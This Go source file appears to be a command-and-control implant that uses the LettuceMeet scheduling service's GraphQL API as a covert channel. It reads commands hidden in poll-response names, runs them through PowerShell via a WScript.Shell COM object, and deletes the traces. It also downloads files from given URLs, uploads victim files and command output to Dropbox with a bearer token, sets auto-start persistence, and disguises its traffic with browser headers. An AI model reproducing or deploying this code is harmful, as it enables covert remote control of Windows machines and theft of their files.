package lettucer

import (
	"LettuceMeet/internal/parser"
	"LettuceMeet/utils"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// function to get recent message
func LettuceSee(path string, whom string, where string) (string, error) {
	jsonData := []byte(fmt.Sprintf(`{
		"id": "EventQuery",
		"query": "query EventQuery(\n  $id: ID!\n) {\n  event(id: $id) {\n    ...Event_event\n    ...EditEvent_event\n    id\n  }\n}\n\nfragment EditEvent_event on Event {\n  id\n  title\n  description\n  type\n  pollStartTime\n  pollEndTime\n  maxScheduledDurationMins\n  pollDates\n  isScheduled\n  start\n  end\n  timeZone\n  updatedAt\n}\n\nfragment Event_event on Event {\n  id\n  title\n  description\n  type\n  pollStartTime\n  pollEndTime\n  maxScheduledDurationMins\n  timeZone\n  pollDates\n  start\n  end\n  isScheduled\n  createdAt\n  updatedAt\n  user {\n    id\n  }\n  googleEvents {\n    title\n    start\n    end\n  }\n  pollResponses {\n    id\n    user {\n      __typename\n      ... on AnonymousUser {\n        name\n        email\n      }\n      ... on User {\n        id\n        name\n        email\n      }\n      ... on Node {\n        __isNode: __typename\n        id\n      }\n    }\n    availabilities {\n      start\n      end\n    }\n    event {\n      id\n    }\n  }\n}",
		"variables": {
			"id": "%s"
		}
	}`, path))

	body, err := LettuceRequest(jsonData)
	if err != nil {
		return "", err
	}

	name, err := LettuceParse(body)
	if err != nil {
		return "", err
	}

	if strings.Contains(name, "#ID ") {
		pathPart := strings.Split(name, "#ID ")
		path = pathPart[1]
		return fmt.Sprintf("Path to LettuceMeet changed to %s\n", path), nil
	}

	if strings.Contains(name, "#Upload ") {
		pathPart := strings.Split(name, "#Upload ")
		urlStr := pathPart[1]
		parsedUrl, err := url.Parse(urlStr)
		if err != nil {
			return "", err
		}

		fileName := utils.LettuceFileName(parsedUrl.Path) // get filename from path
		if fileName == "" {
			err := errors.New("error grabbing filename from url")
			return "", err
		}

		pwd, err := os.Getwd()
		if err != nil {
			return "", err
		}
		location := fmt.Sprintf("%s\\%s", pwd, fileName)
		err = lettuceDownload(location, urlStr)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("file saved to %s\n", pwd), nil
	}

	if strings.Contains(name, "#Download ") {
		parts := strings.Split(name, "#Download ")
		filePath := parts[1]
		where = fmt.Sprintf("/%s", filePath)
		err := lettuceUpload(whom, filePath, where)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("file downloaded to DB from %s\n", filePath), nil
	}

	if strings.Contains(name, "#Auto") {
		err := utils.LettuceAuto()
		if err != nil {
			return "", err
		}
		return "Auto start is now set", nil
	}

	output, err := LettuceTalk(name)
	if err != nil {
		return "", err
	}

	buff := base64.StdEncoding.EncodeToString([]byte(output))

	// if output too long for lettuceMeet char limit, save to DB
	if len(buff) > 4000 {
		err := os.WriteFile("output.txt", []byte(output), 0644)
		if err != nil {
			return "", err
		}
		err = lettuceUpload(whom, "output.txt", where)
		if err != nil {
			return "", nil
		}

		err = os.Remove("output.txt")
		if err != nil {
			return "", err
		}


		return "Output is large, check Drop Box", nil
	}

	return string(output), nil
}

// function to get name and id of most recent post
func LettuceParse(body string) (string, error) {
	var lettuce parser.Lettuce
	var name string

	err := json.Unmarshal([]byte(string(body)), &lettuce)
	if err != nil {
		return "", err
	}

	if len(lettuce.Data.Event.PollResponses) > 0 {
		name = lettuce.Data.Event.PollResponses[0].User.Name
		_, err = base64.StdEncoding.DecodeString(name)
		if err != nil {
			id := strings.TrimSpace(lettuce.Data.Event.PollResponses[0].ID)
			if id != "" {
				err = LettuceDelete(lettuce.Data.Event.PollResponses[0].ID) // deletes message after receiving
				if err != nil {
					return "", err
				}
			}
		} else {
			err = errors.New("b64 encoded string")
			return "", err
		}
	} else {
		err = errors.New("no schedules found")
		return "", err
	}

	return name, nil
}

// function to upload response back to lettuce meet...
func LettuceGreet(path string, greeting string) (string, error) {
	var lettuceSchedule parser.LettuceSchedule

	jsonData := []byte(fmt.Sprintf(`{
		"id": "CreatePollResponseMutation",
		"query": "mutation CreatePollResponseMutation(\n  $input: CreatePollResponseInput!\n) {\n  createPollResponse(input: $input) {\n    pollResponse {\n      id\n      user {\n        __typename\n        ... on AnonymousUser {\n          name\n          email\n        }\n        ... on User {\n          id\n          name\n          email\n          events {\n            id\n          }\n          eventsRespondedTo {\n            id\n          }\n        }\n        ... on Node {\n          __isNode: __typename\n          id\n        }\n      }\n      availabilities {\n        start\n        end\n      }\n      event {\n        id\n        updatedAt\n        user {\n          id\n          name\n          eventsRespondedTo {\n            id\n          }\n        }\n        pollResponses {\n          id\n          event {\n            id\n          }\n          user {\n            __typename\n            ... on AnonymousUser {\n              name\n              email\n            }\n            ... on User {\n              id\n              name\n              email\n            }\n            ... on Node {\n              __isNode: __typename\n              id\n            }\n          }\n          availabilities {\n            start\n            end\n          }\n        }\n      }\n    }\n  }\n}\n",
		"variables": {
			"input": {
				"eventId": "%s",
				"availabilities": [
					{
						"start": "2024-07-14T09:00:00.000Z",
						"end": "2024-07-14T09:30:00.000Z"
					}
				],
				"name": "%s",
				"email": null
			}
		}
	}`, path, greeting))

	body, err := LettuceRequest(jsonData)
	if err != nil {
		return "", err
	}
	err = json.Unmarshal([]byte(body), &lettuceSchedule)
	if err != nil {
		return "", err
	}

	return lettuceSchedule.Data.CreatePollResponse.PollResponse.ID, nil // grab ID to delete response later
}

func lettuceDownload(filepath string, url string) error {
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	resp, err := http.Get(url)
	if err != nil {
		return err
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		err = errors.New("status error requesting file")
		return err
	}

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}

// function to delete a schedule from lettucemeet
func LettuceDelete(id string) error {
	jsonData := []byte(fmt.Sprintf(`{
		"id": "DeletePollResponseMutation",
		"query": "mutation DeletePollResponseMutation(\n  $input: DeletePollResponseInput!\n) {\n  deletePollResponse(input: $input) {\n    pollResponse {\n      id\n      user {\n        __typename\n        ... on AnonymousUser {\n          name\n          email\n        }\n        ... on User {\n          id\n          name\n          email\n          events {\n            id\n          }\n          eventsRespondedTo {\n            id\n          }\n        }\n        ... on Node {\n          __isNode: __typename\n          id\n        }\n      }\n      availabilities {\n        start\n        end\n      }\n      event {\n        id\n        title\n        description\n        type\n        pollStartTime\n        pollEndTime\n        maxScheduledDurationMins\n        timeZone\n        pollDates\n        start\n        end\n        isScheduled\n        createdAt\n        updatedAt\n        user {\n          id\n        }\n        googleEvents {\n          title\n          start\n          end\n        }\n        outlookEvents {\n          title\n          start\n          end\n        }\n        pollResponses {\n          id\n          user {\n            __typename\n            ... on AnonymousUser {\n              name\n              email\n            }\n            ... on User {\n              id\n              name\n              email\n            }\n            ... on Node {\n              __isNode: __typename\n              id\n            }\n          }\n          availabilities {\n            start\n            end\n          }\n          event {\n            id\n          }\n        }\n      }\n    }\n  }\n}\n",
		"variables": {
			"input": {
				"id": "%s"
			}
		}
	}`, id))

	_, err := LettuceRequest(jsonData)
	if err != nil {
		return err
	}
	return nil
}

// using go-ole package to get things done.. change as necessary like os/exec etc..
func LettuceTalk(command string) (string, error) {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		return "", err
	}
	defer unknown.Release()

	wshell, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		defer wshell.Release()
		return "", err
	}
	defer wshell.Release()

	messenger := fmt.Sprintf("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"%s\"", command)
	result := oleutil.MustCallMethod(wshell, "Exec", messenger)
	stdout := oleutil.MustGetProperty(result.ToIDispatch(), "StdOut").ToIDispatch()
	stdoutText := oleutil.MustCallMethod(stdout, "ReadAll").ToString()

	return stdoutText, nil
}

// function to send request to lettucemeet backend
func LettuceRequest(jsonData []byte) (string, error) {
	req, err := http.NewRequest("POST", "https://api.lettucemeet.com/graphql", bytes.NewBuffer(jsonData))
	if err != nil {
		return "", err
	}
	req.Header.Add("Content-Length", "1040")
	req.Header.Add("Sec-Ch-Ua", "Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\"")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Add("Accept-Language", "en-US")
	req.Header.Add("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36")
	req.Header.Add("Sec-Ch-Ua-Platform", "Windows")
	req.Header.Add("Origin", "https//lettucemeet.com")
	req.Header.Add("Sec-Fetch-Site", "same-site")
	req.Header.Add("Sec-Fetch-Mode", "cors")
	req.Header.Add("Sec-Fetch-Dest", "emtpy")
	req.Header.Add("Referer", "https//lettucemeet.com/")
	req.Header.Add("Accept-Encoding", "gzip, deflate, br")
	req.Header.Add("Priority", "ui=1, i")

	client := http.DefaultClient
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func lettuceUpload(whom string, what string, where string) error {
	stuff, err := os.ReadFile(what)
	if err != nil {
		return err
	}

	jsonArg := map[string]interface{}{
		"path":       where,
		"mode":       "overwrite",
		"autorename": false,
		"mute":       false,
	}

	jsonArgStr, err := json.Marshal(jsonArg)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", "https://content.dropboxapi.com/2/files/upload", bytes.NewBuffer(stuff))
	if err != nil {
		return err
	}

	req.Header.Set("Authorization", "Bearer "+whom)
	req.Header.Set("Dropbox-API-Arg", string(jsonArgStr))
	req.Header.Set("Content-Type", "application/octet-stream")

	client := http.DefaultClient
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}
